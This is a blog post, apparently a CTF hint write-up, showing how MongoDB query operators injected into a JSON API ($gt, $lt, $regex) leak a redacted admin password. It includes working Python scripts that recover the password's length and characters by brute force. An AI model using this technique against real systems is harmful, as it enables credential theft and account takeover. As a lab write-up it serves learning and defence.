---
title: Mongo DB Data Exfiltration via Search Conditions
date: 2023-11-07
programming/languages:
- Python
programming/topics:
- CTF
- Security
- Exfiltration
- MongoDB
series:
- 2023 CTF Hints
---
I recently participated in a security capture the flag (CTF) exercise through work. The goal was--in a wide variety of ways--to find a hidden string of the form `flag{...}` somewhere in the problem. Some required exploiting sample websites, some parsing various data formats or captures, some required reverse engineering code or binaries, and (new this year) some required messing with LLMs. 

As I tend to do for just about everything, I ended up writing up my own experiences. I won't share that, since it's fairly tuned to the specific problems and thus 1) not interesting and 2) probably not mine to share, but I did want want to share a few interesting techniques I found/used. If it helps anyone either defend against similar attacks in the real world or (more importantly :smile:) someone comes across this while trying to solve a CTF of their own, all the better. 

Okay, first technique: extracting data from a MongoDB database using search conditions.

<!--more-->

In this specific problem, we had a website backed by a MongoDB database. As one of the later steps of the attack, you find an API. For example, you can query `/api/review` with the given example `{"title": "Thornhedge"}`:

```http
POST /api/review HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_access_token_here

{
    "title": "Thornhedge"
}
```

Which returns:

```json
[
    {
        "date": "2023-10-28",
        "title": "Thornhedge",
        "type": "Book",
        "series": "",
        "index": "",
        "author": "T. Kingfisher"
    }
]
```

A little more exploration finds something all sorts of interesting:

```http
POST /api/review HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_access_token_here

{
    "name": "admin"
}
```

Returning:

```json
[
    {
        "name": "admin",
        "email": "admin@example.com",
        "password": "**REDACTED**"
    }
]
```

Ooh, getting an admin account is always handy. :smile: But the password is redacted. :sad:

This right here is why knowing that the DB is MongoDB is handy: [query selectors](https://www.mongodb.com/docs/manual/reference/operator/query/). Say what? A programming language with JSON as the syntax? Weird. Wonderful.

Specifically, you can write a query like this:

```http
POST /api/review HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_access_token_here

{
  "$and": [
    { "name": "admin" },
    { "password": { "$gt": "m" } }
  ]
}
```

As expected, `$and` means you have to match both specifications. `{ "password": { "$gt": "m" } }` isn't asking for a weird password; it's saying that the password is `greater than` the character `m`.

Response:

```json
[]
```

So, not that. Change the `$gt` out for `$lt` and verify:

```json
[
    {
        "name": "admin",
        "email": "admin@example.com",
        "password": "**REDACTED**"
    }
]
```

Okay. That tells us something. The character is [[wiki:lexicographically]] before `m`. We could keep going like this with a binary search, but we have another tool at our disposal:

```python
import itertools
import requests

headers = {...}
domain = "..."

password_length = 0

for length in itertools.count(start=1):
    response = requests.post(
        f'https://{domain}/api/users',
        headers=headers,
        json={
            'name': 'admin',
            'password': {'$regex': '^.{%d}$' % length}
        }
    )

    if response.json()['users']:
        password_length = length
        print(f'Password length is {length}')
        break
```

`$regex` lets us write a [[wiki:regular expression]]() to query our data. So if we want to ask if the password has a length of (say) 5, we can write the query `^.{5}$` where `^` and `$` mark the beginning and end of the password (otherwise we'll get a minimum length; not an absolute one), `.` matches any character and `{5}` says match 5 of them. Loop until we get a hit. 

Okay, we know how long the password is. We can do the same thing to actually match each character in turn:

```python
password = []

while len(password) < password_length:
    for c in range(32, 128):
        current_password = ''.join(password + [chr(c)])

        response = requests.post(
            f'https://{domain}/api/users',
            headers=headers,
            json={
                'name': 'admin',
                'password': {'$regex': '^' + re.escape(current_password)}
            }
        )

        if response.json()['users']:
            password.append(chr(c))
            break

print(''.join(password))
```

This is much the same. As we're going, we're going to have a query that looks like `^f`, then `^fl` etc. as we get each character of the password. One big caveat is that we do need to use `re.escape` to handle characters that are both in the password and have meaning in regular expressions. Go through the [[wiki:printable ASCII characters]]() (32-128) and just keep hammering away until you've got it:

```text
$ python crack.py
...
Password length is 28

...
d
e
f
...
fk
fl
...
flag{this_was_not_the_flag!}
```

Pretty elegant! 

It wasn't the first step (that was getting the bearer token), but since the password looks like a flag, it was the last. Pretty neat one. Onward!
